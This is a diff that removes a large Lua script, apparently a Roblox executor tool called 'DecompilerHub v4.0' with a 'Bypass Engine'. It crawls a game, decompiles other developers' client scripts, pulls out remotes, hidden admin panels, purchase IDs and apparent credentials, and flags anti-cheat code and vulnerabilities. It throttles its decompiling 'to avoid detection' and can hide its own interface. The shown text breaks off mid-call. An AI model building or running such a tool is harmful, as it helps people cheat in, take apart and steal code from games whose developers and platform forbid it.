-            if v.lvl == "CRITICAL" then tag = " [!!!]" end
-            p[#p+1] = string.format("  [%s%s] %s  (score=%d)\n", v.lvl, tag, v.desc, v.scr or 0)
-            if v.path then p[#p+1] = "       " .. v.path .. "\n" end
-        end
-    end
-    p[#p+1] = "\n"
-
-    local asArr = {}
-    for k in pairs(r.assetIDs) do asArr[#asArr+1] = k end; table.sort(asArr)
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " ASSET CATEGORIZATION  (" .. #asArr .. " assets, " .. #r.assetCtx .. " ctx refs)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #asArr > 0 then
-        p[#p+1] = "  IDs (ilk 50):\n"
-        local max = math.min(#asArr, 50)
-        for i = 1, max do p[#p+1] = "    " .. asArr[i] .. "\n" end
-        if #asArr > 50 then p[#p+1] = "    ... +" .. (#asArr - 50) .. " more\n" end
-    end
-    if #r.assetCtx > 0 then
-        p[#p+1] = "  Context (" .. #r.assetCtx .. "):\n"
-        local max = math.min(#r.assetCtx, 30)
-        for i = 1, max do p[#p+1] = "    " .. r.assetCtx[i] .. "\n" end
-        if #r.assetCtx > 30 then p[#p+1] = "    ... +" .. (#r.assetCtx - 30) .. " more\n" end
-    end
-    if #asArr == 0 and #r.assetCtx == 0 then p[#p+1] = "  (none)\n" end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " ANTI-CHEAT PATTERN SCANNER  (" .. #r.antiCheat .. " findings)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.antiCheat == 0 then p[#p+1] = "  (none)\n" else
-        for _, v in ipairs(r.antiCheat) do
-            p[#p+1] = string.format("  [%s] %s\n", v.lvl, v.desc)
-            if v.path then p[#p+1] = "       " .. v.path .. "\n" end
-        end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " OBFUSCATION SCANNER  (" .. #r.obfuscation .. " findings)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.obfuscation == 0 then p[#p+1] = "  (none)\n" else
-        for _, v in ipairs(r.obfuscation) do
-            p[#p+1] = string.format("  [%s] %s\n", v.lvl, v.desc)
-            if v.path then p[#p+1] = "       " .. v.path .. "\n" end
-        end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " HOOK / ENVIRONMENT DETECTION  (" .. #r.hooks .. " findings)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.hooks == 0 then p[#p+1] = "  (none)\n" else
-        for _, v in ipairs(r.hooks) do
-            p[#p+1] = string.format("  [%s] %s\n", v.lvl, v.desc)
-            if v.path then p[#p+1] = "       " .. v.path .. "\n" end
-        end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " NETWORK & PHYSICS AUDIT\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    local naCount = #r.networkAudit
-    p[#p+1] = string.format("  Unanchored parts: %d\n  Network findings: %d\n", r.unanchored or 0, naCount)
-    if naCount > 0 then
-        for _, v in ipairs(r.networkAudit) do p[#p+1] = "  > " .. v .. "\n" end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " EXTERNAL CONNECTION SCANNER  (" .. #r.extConns .. " connections)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.extConns == 0 then p[#p+1] = "  (none)\n" else
-        for _, v in ipairs(r.extConns) do p[#p+1] = "  > " .. v .. "\n" end
-    end
-    p[#p+1] = "\n"
-
-    if r.remoteCreations and #r.remoteCreations > 0 then
-        p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        p[#p+1] = " REMOTE CREATION DETECTION  (" .. #r.remoteCreations .. " instances)\n"
-        p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        for _, rc in ipairs(r.remoteCreations) do
-            p[#p+1] = string.format("  > Instance.new(\"%s\") -> var: %s, type: %s\n", rc.class, rc.var, rc.type)
-        end
-        p[#p+1] = "\n"
-    end
-
-    if r.sharedVars and #r.sharedVars > 0 then
-        p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        p[#p+1] = " _G / SHARED VARIABLE TRACKING  (" .. #r.sharedVars .. " accesses)\n"
-        p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        local writes = {}; local reads = {}
-        for _, sv in ipairs(r.sharedVars) do
-            if sv.type == "write" then writes[#writes+1] = sv else reads[#reads+1] = sv end
-        end
-        if #writes > 0 then
-            p[#p+1] = "  Writes (" .. #writes .. "):\n"
-            for _, sv in ipairs(writes) do
-                p[#p+1] = string.format("    %s = %s\n", sv.var, sv.snippet or "?")
-            end
-        end
-        if #reads > 0 then
-            p[#p+1] = "  Reads (" .. #reads .. "):\n"
-            local seen = {}
-            for _, sv in ipairs(reads) do
-                if not seen[sv.var] then
-                    seen[sv.var] = true
-                    p[#p+1] = string.format("    _G.%s\n", sv.var)
-                end
-            end
-        end
-        p[#p+1] = "\n"
-    end
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " INSTANCE DEEP SCAN  (" .. #r.instanceDetails .. ")\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.instanceDetails == 0 then p[#p+1] = "  (none)\n" else
-        for _, v in ipairs(r.instanceDetails) do p[#p+1] = "  > " .. v .. "\n" end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " VALUES  (" .. #r.values .. ")\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.values == 0 then p[#p+1] = "  (none)\n" else
-        for _, v in ipairs(r.values) do p[#p+1] = "  > " .. tostring(v) .. "\n" end
-    end
-    p[#p+1] = "\n"
-
-    local function setToArr(t) local a = {}; for k in pairs(t) do a[#a+1] = k end; table.sort(a); return a end
-    local svArr = setToArr(r.servicesFound)
-    local gpArr = setToArr(r.gamepassIDs)
-    local dpArr = setToArr(r.devprodIDs)
-    local bdArr = setToArr(r.badgeIDs)
-    local asArr2 = setToArr(r.assetIDs)
-    if #asArr2 > 0 or #gpArr > 0 or #dpArr > 0 or #bdArr > 0 or #svArr > 0 then
-        p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        p[#p+1] = " EXTRACTED DATA\n"
-        p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        if #svArr > 0 then p[#p+1] = "\n  SERVICES:"; for _, s in ipairs(svArr) do p[#p+1] = "\n    " .. s end; p[#p+1] = "\n" end
-        if #gpArr > 0 then p[#p+1] = "\n  GAMEPASS:"; for _, id in ipairs(gpArr) do p[#p+1] = "\n    " .. id end; p[#p+1] = "\n" end
-        if #dpArr > 0 then p[#p+1] = "\n  DEVPRODUCT:"; for _, id in ipairs(dpArr) do p[#p+1] = "\n    " .. id end; p[#p+1] = "\n" end
-        if #bdArr > 0 then p[#p+1] = "\n  BADGE:"; for _, id in ipairs(bdArr) do p[#p+1] = "\n    " .. id end; p[#p+1] = "\n" end
-        if #asArr2 > 0 then
-            p[#p+1] = "\n  ASSET (" .. #asArr2 .. "):"
-            for i = 1, math.min(#asArr2, 100) do p[#p+1] = "\n    " .. asArr2[i] end
-            if #asArr2 > 100 then p[#p+1] = "\n    ... +" .. (#asArr2 - 100) .. " more" end
-            p[#p+1] = "\n"
-        end
-        p[#p+1] = "\n"
-    end
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " DECOMPILED SOURCE CODE  (" .. #r.scripts .. ")\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    if #r.scripts > 0 then
-        for _, v in ipairs(r.scripts) do
-            p[#p+1] = string.rep("-", 60) .. "\n"
-            p[#p+1] = string.format("-- [%s]  Path: %s\n-- Method: %s\n", v.t, v.path, v.method)
-            if v.tags and #v.tags > 0 then p[#p+1] = "-- Tags: " .. table.concat(v.tags, ", ") .. "\n" end
-            if v.remoteCalls and #v.remoteCalls > 0 then
-                for _, rc in ipairs(v.remoteCalls) do
-                    p[#p+1] = string.format("--   %s: %s(%s)\n", rc.type, rc.remote, rc.argsStr)
-                end
-            end
-            p[#p+1] = string.rep("-", 60) .. "\n"
-            p[#p+1] = (v.src and #v.src > 0) and v.src .. "\n" or "-- (Source unavailable)\n"
-            p[#p+1] = "\n"
-        end
-    end
-
-    local ucexe = "Unknown"
-    pcall(function()
-        local f = (typeof(getexecutorname) == "function" and getexecutorname()) or (typeof(identify_executor) == "function" and identify_executor()) or nil
-        if f then ucexe = tostring(f) end
-    end)
-    p[#p+1] = "\nDecompiled By: " .. (LP and LP.Name or "Unknown") .. " (" .. (LP and LP.DisplayName or "Unknown") .. ") | ID: " .. (LP and tostring(LP.UserId) or "Unknown") .. "\n"
-    p[#p+1] = "Executor: " .. ucexe .. "\n"
-    p[#p+1] = "═══════════════════ END OF REPORT ═══════════════════\n"
-    return table.concat(p)
-end
-
-__prog = nil
-function __updlog() end
-
-local function scanGame(scanSpeed, upfunc, progfunc)
-    local r = {
-        remotes = {}, scripts = {}, values = {}, buttons = {},
-        assetIDs = {}, gamepassIDs = {}, devprodIDs = {}, badgeIDs = {}, servicesFound = {},
-        instanceDetails = {}, scriptStatus = {}, detectors = {}, promptParents = {},
-        adminPanels = {}, networkAudit = {}, unanchored = 0,
-        creds = {}, chatCmds = {}, vulns = {}, extConns = {}, assetCtx = {},
-        antiCheat = {}, obfuscation = {}, hooks = {}, remoteCreations = {}, sharedVars = {},
-        parts = 0, folders = 0, models = 0, total = 0, gameName = "Unknown"
-    }
-
-    local gn = getGameName()
-    r.gameName = gn
-
-    if progfunc then progfunc("Scanning " .. gn .. "...", "scan") elseif __prog then __prog("Scanning " .. gn .. "...", "scan") end
-    if upfunc then upfunc(0, 0, 0, 0, "scan") elseif updateProgress then updateProgress(0, 0, 0, 0, "scan") end
-
-    local queue, head = { game }, 1
-    local scCount = 0; local proc = 0; local lastReport = 0; local startTime = os.clock(); local yieldTime = os.clock()
-    local scQueue = {} -- collected scripts for phase 2
-    local statusInterval = math.max(20, math.floor(200 / scanSpeed))
-    local yieldInterval = lowDeviceMode and math.max(5, scanSpeed) or math.max(3, scanSpeed * 3)
-    local yieldThreshold = lowDeviceMode and 0.001 or (0.003 * scanSpeed)
-
-    while head <= #queue do
-        if scanAborted then
-            if progfunc then progfunc("Scan aborted by user.", "warn") elseif __prog then __prog("Scan aborted by user.", "warn") end
-            if upfunc then upfunc(0, 0, 0, 0, "aborted") elseif updateProgress then updateProgress(0, 0, 0, 0, "aborted") end
-            return nil
-        end
-
-        local inst = queue[head]; head = head + 1
-        proc = proc + 1
-        if proc % yieldInterval == 0 then
-            if os.clock() - yieldTime >= yieldThreshold then task.wait(); yieldTime = os.clock() end
-        end
-
-        local ok1, cls = pcall(function() return inst.ClassName end)
-        if not ok1 then cls = "?" end
-
-        r.total = r.total + 1
-
-        if r.total - lastReport >= statusInterval then
-            lastReport = r.total
-            local elapsed = os.clock() - startTime
-            local rate = elapsed > 0 and math.floor(r.total / elapsed) or 0
-            if progfunc then progfunc(string.format("Scanning %d instances | %d scripts | %d/sec", r.total, #scQueue, rate), "scan") elseif __prog then __prog(string.format("Scanning %d instances | %d scripts | %d/sec", r.total, #scQueue, rate), "scan") end
-            if upfunc then upfunc(r.total, #scQueue, rate, elapsed, "scan") elseif updateProgress then updateProgress(r.total, #scQueue, rate, elapsed, "scan") end
-        end
-
-        if SCRIPT_CLASSES[cls] then
-            if not isRobloxInternal(inst) then
-                local path = fullPath(inst)
-                scQueue[#scQueue+1] = { inst = inst, path = path }
-            end
-        else
-            if REMOTE_CLASSES[cls] then
-                r.remotes[#r.remotes+1] = string.format("[%s] %s", cls, fullPath(inst))
-            elseif cls:find("Value$") then
-                local okV, val = pcall(function() return tostring(inst.Value) end)
-                if okV then
-                    local valStr = string.format("[%s] %s = %s", cls, fullPath(inst), trunc(val, 120))
-                    r.values[#r.values+1] = valStr
-                    if cls == "BoolValue" or cls == "StringValue" or cls == "ObjectValue" or cls == "NumberValue" then
-                        r.instanceDetails[#r.instanceDetails+1] = valStr
-                    end
-                end
-            elseif cls == "ClickDetector" then
-                local okP, parent = pcall(function() return fullPath(inst.Parent) end)
-                if okP then r.detectors[#r.detectors+1] = string.format("ClickDetector -> %s", parent) end
-            elseif cls == "ProximityPrompt" then
-                local okP, parent = pcall(function() return fullPath(inst.Parent) end)
-                if okP then r.promptParents[#r.promptParents+1] = string.format("ProximityPrompt -> %s", parent) end
-            elseif cls:find("Frame$") or cls == "ScrollingFrame" or cls == "ScreenGui" then
-                local okV, vis = pcall(function() return inst.Visible end)
-                local tb, bt = false, false; local nm = (inst.Name or ""):lower()
-                local okC, ch = pcall(function() return inst:GetChildren() end)
-                if okC and ch then
-                    for _, c in ipairs(ch) do
-                        local cn = c.ClassName
-                        if cn == "TextBox" then tb = true end
-                        if cn == "TextButton" or cn == "ImageButton" then bt = true end
-                    end
-                end
-                if tb and bt then
-                    local fl = {}
-                    if okV and not vis then fl[#fl+1] = "Hidden" end
-                    if nm:find("admin") or nm:find("panel") or nm:find("owner") or nm:find("debug") or nm:find("staff") or nm:find("mod") or nm:find("control") then fl[#fl+1] = "Name:" .. inst.Name end
-                    if #fl > 0 then r.adminPanels[#r.adminPanels+1] = string.format("[%s] %s (%s)", cls, fullPath(inst), table.concat(fl, ", ")) end
-                end
-            elseif cls == "ImageButton" or cls == "TextButton" then
-                r.buttons[#r.buttons+1] = string.format("[%s] %s", cls, fullPath(inst))
-            elseif PART_CLASSES[cls] then
-                r.parts = r.parts + 1
-                local okA, anc = pcall(function() return inst.Anchored end)
-                if okA and not anc then
-                    r.unanchored = r.unanchored + 1
-                    if r.unanchored <= 30 then r.networkAudit[#r.networkAudit+1] = string.format("Unanchored: %s", fullPath(inst)) end
-                end
-                for _, bm in ipairs({ "BodyVelocity", "BodyPosition", "BodyForce", "BodyGyro", "BodyThrust", "RocketPropulsion" }) do
-                    local okB, bc = pcall(function() return inst:FindFirstChildOfClass(bm) end)
-                    if okB and bc then r.networkAudit[#r.networkAudit+1] = string.format("%s on: %s", bm, fullPath(inst)) end
-                end
-            elseif cls == "Folder" then
-                r.folders = r.folders + 1
-            elseif cls == "Model" then
-                r.models = r.models + 1
-            end
-        end
-
-        local okC, kids = pcall(inst.GetChildren, inst)
-        if okC and kids then
-            if inst == game then
-                for _, c in ipairs(kids) do
-                    if not ROBLOX_INTERNAL_KEYWORDS[c.Name] then
-                        queue[#queue+1] = c
-                    end
-                end
-            else
-                for _, c in ipairs(kids) do
-                    queue[#queue+1] = c
-                end
-            end
-        end
-    end
-
-    if scanAborted then return nil end
-
-    -- Phase 2: Decompile all collected scripts (burst mode)
-    local BURST_TIME = lowDeviceMode and 2 or 3
-    local WAIT_TIME = lowDeviceMode and 2 or 1.5
-    local burstStart = os.clock()
-    local waiting = false
-    local gcTimer = 0
-    local idx = 1
-    if progfunc then progfunc(string.format("Decompiling %d scripts...", #scQueue), "decompile") elseif __prog then __prog(string.format("Decompiling %d scripts...", #scQueue), "decompile") end
-
-    while idx <= #scQueue do
-        if scanAborted then return nil end
-
-        if waiting then
-            task.wait(0)
-            if os.clock() - burstStart >= WAIT_TIME then
-                waiting = false
-                burstStart = os.clock()
-                if progfunc then progfunc("Continuing...", "scan") elseif __prog then __prog("Continuing...", "scan") end
-            else
-                if idx % 5 == 0 then
-                    if progfunc then progfunc(string.format("Waiting... (%.1fs)", WAIT_TIME - (os.clock() - burstStart)), "wait") elseif __prog then __prog(string.format("Waiting... (%.1fs)", WAIT_TIME - (os.clock() - burstStart)), "wait") end
-                end
-            end
-        else
-            local entry = scQueue[idx]
-            local inst, path = entry.inst, entry.path
-            local method, src = tryDecompile(inst)
-            local tags = {}
-            local remoteCalls = {}
-            local requires = {}
-            local a = {}; local deeps = { creds = {}, chatCmds = {}, vulns = {}, extConns = {}, assetCtx = {}, antiCheat = {}, obfuscation = {}, hooks = {} }
-            if src and #src > 0 then
-                a = analyzeSource(src)
-                deeps = deepAnalyze(src)
-                for k in pairs(a.assets) do r.assetIDs[k] = true end
-                for k in pairs(a.gamepass) do r.gamepassIDs[k] = true end
-                for k in pairs(a.devprod) do r.devprodIDs[k] = true end
-                for k in pairs(a.badge) do r.badgeIDs[k] = true end
-                for k in pairs(a.services) do r.servicesFound[k] = true end
-                for k in pairs(a.keywords) do tags[#tags+1] = k end
-                for k in pairs(a.libraries) do tags[#tags+1] = k end
-                for k in pairs(a.tags) do tags[#tags+1] = k end
-                for _, rc in ipairs(a.remotes) do remoteCalls[#remoteCalls+1] = rc end
-                for k in pairs(a.requires) do requires[k] = true end
-                for _, v in ipairs(deeps.creds) do r.creds[#r.creds+1] = v end
-                for _, v in ipairs(deeps.chatCmds) do r.chatCmds[#r.chatCmds+1] = v end
-                for _, v in ipairs(deeps.extConns) do r.extConns[#r.extConns+1] = v end
-                for _, v in ipairs(deeps.assetCtx) do r.assetCtx[#r.assetCtx+1] = v end
-                for _, v in ipairs(deeps.antiCheat) do r.antiCheat[#r.antiCheat+1] = v end
-                for _, v in ipairs(deeps.obfuscation) do r.obfuscation[#r.obfuscation+1] = v end
-                for _, v in ipairs(deeps.hooks) do r.hooks[#r.hooks+1] = v end
-                for _, v in ipairs(deeps.vulns) do
-                    v.path = path
-                    r.vulns[#r.vulns+1] = v
-                end
-                for _, rc in ipairs(a.remoteCreations) do r.remoteCreations[#r.remoteCreations+1] = rc end
-                for _, sv in ipairs(a.sharedVars) do r.sharedVars[#r.sharedVars+1] = { var = sv.var, type = sv.type, snippet = sv.snippet } end
-            end
-            r.scripts[#r.scripts+1] = { t = inst.ClassName, path = path, method = method or "none", src = src, tags = tags, remoteCalls = remoteCalls, requires = requires, dynamicRemote = a.dynamicRemote, isConfig = a.isConfig, creds = deeps.creds, chatCmds = deeps.chatCmds, extConns = deeps.extConns, vulns = deeps.vulns, remoteCreations = a.remoteCreations or {}, sharedVars = a.sharedVars or {} }
-            idx = idx + 1
-            if (idx - 1) % (lowDeviceMode and 1 or math.max(2, scanSpeed)) == 0 then task.wait() end
-            local processed = idx - 1
-            if processed % 10 == 0 or processed == #scQueue or processed == 1 then
-                if progfunc then progfunc(string.format("Script %d/%d: %s (%s)", processed, #scQueue, trunc(path, 50), method or "?"), "script") elseif __prog then __prog(string.format("Script %d/%d: %s (%s)", processed, #scQueue, trunc(path, 50), method or "?"), "script") end
-                if upfunc then upfunc(processed, #scQueue, method, path, "decompile") elseif updateProgress then updateProgress(processed, #scQueue, method, path, "decompile") end
-            end
-
-            if os.clock() - burstStart >= BURST_TIME then
-                waiting = true
-                burstStart = os.clock()
-                if lowDeviceMode then
-                    gcTimer = gcTimer + 1
-                    if gcTimer % 5 == 0 then collectgarbage() end
-                end
-                if progfunc then progfunc(string.format("Waiting %.1fs to avoid detection...", WAIT_TIME), "wait") elseif __prog then __prog(string.format("Waiting %.1fs to avoid detection...", WAIT_TIME), "wait") end
-            end
-        end
-    end
-    if lowDeviceMode then collectgarbage() end
-
-    if progfunc then progfunc("Resolving require paths...", "info") elseif __prog then __prog("Resolving require paths...", "info") end
-    if upfunc then upfunc(0, 0, 0, 0, "post") elseif updateProgress then updateProgress(0, 0, 0, 0, "post") end
-    do
-        local moduleByPath = {}
-        for _, v in ipairs(r.scripts) do
-            if v.t == "ModuleScript" then moduleByPath[v.path] = v end
-        end
-        for _, v in ipairs(r.scripts) do
-            local resolved = {}
-            for rawPath in pairs(v.requires or {}) do
-                local resolvedPath = rawPath
-                local ok, transformed = pcall(function()
-                    local p = rawPath
-                    p = p:gsub("^script%.Parent%.", ""):gsub("^script%.", ""):gsub("%.", ":")
-                    local base = v.path:match("^(.+)%.[^%.]+$") or v.path
-                    local attempt = base .. ":" .. p
-                    if moduleByPath[attempt] then return attempt end
-                    if moduleByPath[rawPath] then return rawPath end
-                    return rawPath
-                end)
-                if ok and transformed then resolvedPath = transformed end
-                resolved[resolvedPath] = true
-            end
-            v.requires = resolved
-        end
-    end
-
-    if progfunc then progfunc("Building module dependency tree...", "info") elseif __prog then __prog("Building module dependency tree...", "info") end
-    do
-        local modRefs = {}
-        for _, v in ipairs(r.scripts) do
-            for path in pairs(v.requires or {}) do
-                if not modRefs[path] then modRefs[path] = {} end
-                modRefs[path][#modRefs[path]+1] = v.path
-            end
-        end
-        r.moduleRefs = modRefs
-        r.moduleCount = 0
-        for _ in pairs(modRefs) do r.moduleCount = r.moduleCount + 1 end
-    end
-
-    if progfunc then progfunc("Building cross-reference...", "info") elseif __prog then __prog("Building cross-reference...", "info") end
-    buildCrossReference(r.scripts)
-
-    if progfunc then
-        progfunc(string.format("Scan complete! %d instances, %d scripts", r.total, #r.scripts), "done")
-    elseif __prog then
-        __prog(string.format("Scan complete! %d instances, %d scripts", r.total, #r.scripts), "done")
-    end
-    if upfunc then upfunc(r.total, #r.scripts, 0, 0, "done") elseif updateProgress then updateProgress(r.total, #r.scripts, 0, 0, "done") end
-    return buildReport(r)
-end
-
--- Hide/show GUI with Backspace
-local UserInputService = game:GetService("UserInputService")
-local guiHidden = false
-local hideKeyConn = UserInputService.InputBegan:Connect(function(input, gp)
-    if not gp and input.KeyCode == Enum.KeyCode.Backspace then
-        guiHidden = not guiHidden
-        if guiHidden then
-            if conGui then conGui.Enabled = false end
-            if addProg then addProg("GUI hidden (Backspace to show)", "warn") end
-        else
-            if conGui then conGui.Enabled = true end
-            if addProg then addProg("GUI shown", "info") end
-        end
-    end
-end)
-
-local Window = Rayfield:CreateWindow({
-    Name = "DecompilerHub v4.0 (FIXED)",
-    LoadingTitle = "Game Scanner + Bypass Engine",
-    LoadingSubtitle = "Cross-Reference + Anti-Cheat + Obfuscation Scanner",
-    Theme = "Default",
-    ConfigurationSaving = { Enabled = false },
-    KeySystem = false,
-})
-
-local Tab = Window:CreateTab("Scanner", 0)
-
-local progLines = {}
-local logBox, logTxt, conFrame, conGui
-local autoScroll = true
-
-local function destroyConsole()
-    pcall(function()
-        if conGui then
-            conGui:Destroy()
-            conGui = nil; logBox = nil; logTxt = nil; conFrame = nil
-            progBar = nil; progTxt = nil; progFill = nil
-        end
-    end)
-end
-
-local progBar, progTxt, progFill
-
-local function createConsole()
-    destroyConsole()
-    conGui = Instance.new("ScreenGui"); conGui.Name = "DHConsole"; conGui.Enabled = true
-
-    conFrame = Instance.new("Frame")
-    conFrame.Size = UDim2.new(1, 0, 0, 222)
-    conFrame.Position = UDim2.new(0, 0, 1, -222)
-    conFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 16)
-    conFrame.BorderSizePixel = 0
-    conFrame.Parent = conGui
-
-    logBox = Instance.new("ScrollingFrame")
-    logBox.Size = UDim2.new(1, -6, 1, -28)
-    logBox.Position = UDim2.new(0, 3, 0, 3)
-    logBox.BackgroundColor3 = Color3.fromRGB(8, 8, 16)
-    logBox.BorderSizePixel = 0
-    logBox.ScrollBarThickness = 6
-    logBox.CanvasSize = UDim2.new(0, 0, 0, 0)
-    logBox.Parent = conFrame
-    logBox:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
-        if logBox then
-            local atBottom = (logBox.CanvasPosition.Y + logBox.AbsoluteWindowSize.Y) >= (logBox.CanvasSize.Y.Offset - 10)
-            autoScroll = atBottom
-        end
-    end)
-
-    logTxt = Instance.new("TextLabel")
-    logTxt.Size = UDim2.new(1, -10, 1, -6)
-    logTxt.Position = UDim2.new(0, 5, 0, 3)
-    logTxt.Text = ""
-    logTxt.TextColor3 = Color3.fromRGB(150, 230, 150)
-    logTxt.Font = Enum.Font.Code
-    logTxt.TextSize = 12
-    logTxt.RichText = true
-    logTxt.TextXAlignment = Enum.TextXAlignment.Left
-    logTxt.TextYAlignment = Enum.TextYAlignment.Top
-    logTxt.BackgroundTransparency = 1
-    logTxt.Parent = logBox
-
-    progBar = Instance.new("Frame")
-    progBar.Size = UDim2.new(1, -6, 0, 20)
-    progBar.Position = UDim2.new(0, 3, 1, -24)
-    progBar.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    progBar.BorderSizePixel = 1
-    progBar.BorderColor3 = Color3.fromRGB(60, 60, 80)
-    progBar.Parent = conFrame
-
-    progFill = Instance.new("Frame")
-    progFill.Size = UDim2.new(0, 0, 1, 0)
-    progFill.BackgroundColor3 = Color3.fromRGB(80, 200, 80)
-    progFill.BorderSizePixel = 0
-    progFill.Parent = progBar
-
-    progTxt = Instance.new("TextLabel")
-    progTxt.Size = UDim2.new(1, 0, 1, 0)
-    progTxt.Text = ""
-    progTxt.TextColor3 = Color3.fromRGB(200, 255, 200)
-    progTxt.Font = Enum.Font.Code
-    progTxt.TextSize = 14
-    progTxt.RichText = true
-    progTxt.BackgroundTransparency = 1
-    progTxt.TextXAlignment = Enum.TextXAlignment.Center
-    progTxt.Parent = progBar
-
-    pcall(function() conGui.Parent = game:GetService("CoreGui") end)
-    progTxt.Text = "<font color='#50C8FF' size='18'>0%</font>"
-end
-
-local function updateProgress(instCount, scCount, rate, elapsed, phase)
-    if not progTxt or not progFill then return end
-    local pct = 0
-    if phase == "scan" then
-        pct = math.min(95, math.floor((instCount / math.max(instCount + 500, 1)) * 95))
-        local color = pct < 40 and "#50C8FF" or (pct < 70 and "#FFD700" or "#50FF50")
-        progTxt.Text = string.format("<font color='%s' size='18'>%d%%</font>", color, pct)
-    elseif phase == "decompile" then
-        pct = math.floor((instCount / math.max(scCount, 1)) * 85) + 10
-        progTxt.Text = string.format("<font color='#FFD700' size='14'>Decompile %d/%d</font>", instCount, scCount)
-    elseif phase == "post" then
-        progTxt.Text = "<font color='#FFD700' size='14'>Processing...</font>"
-    elseif phase == "done" then
-        progTxt.Text = "<font color='#50FF50' size='18'>100%</font>"
-        pct = 100
-    elseif phase == "error" then
-        progTxt.Text = "<font color='#FF5050' size='14'>ERROR</font>"
-    elseif phase == "aborted" then
-        progTxt.Text = "<font color='#FFA500' size='14'>ABORTED</font>"
-    else
-        progTxt.Text = ""
-        pct = 0
-    end
-    progFill.Size = UDim2.new(pct / 100, 0, 1, 0)
-end
-
-local function updateCon()
-    local txt = table.concat(progLines, "\n")
-    pcall(function() if logTxt then logTxt.Text = txt end end)
-    pcall(function()
-        if logBox and logTxt then
-            local h = #progLines * 15
-            logTxt.Size = UDim2.new(1, -10, 0, h)
-            logBox.CanvasSize = UDim2.new(0, 0, 0, h)
-            if autoScroll then logBox.CanvasPosition = Vector2.new(0, h) end
-        end
-    end)
-end
-
-local lastMsgType = "info"
-local function addProg(msg, msgType)
-    msgType = msgType or "info"
-    local color
-    if msgType == "info" then color = "#96E696"
-    elseif msgType == "warn" then color = "#FFD700"
-    elseif msgType == "error" then color = "#FF5050"
-    elseif msgType == "done" then color = "#50FF50"
-    elseif msgType == "scan" then color = "#50C8FF"
-    elseif msgType == "script" then color = "#C8A0FF"
-    else color = "#96E696" end
-    local ts = os.date("%H:%M:%S")
-    progLines[#progLines+1] = string.format("<font color='#808080'>[%s]</font> <font color='%s'>%s</font>", ts, color, msg)
-    if #progLines > 200 then table.remove(progLines, 1) end
-    updateCon()
-end
-
-__prog = addProg
-__updlog = updateCon
-updateProgress = updateProgress
-scanSpeed = 5
-lowDeviceMode = false
-
-local scanBusy = false
-
-Tab:CreateInput({ Name = "Scan Speed (1-10)", PlaceholderText = "5", Numeric = true, RemoveTextAfterFocusLost = false, Callback = function(v)
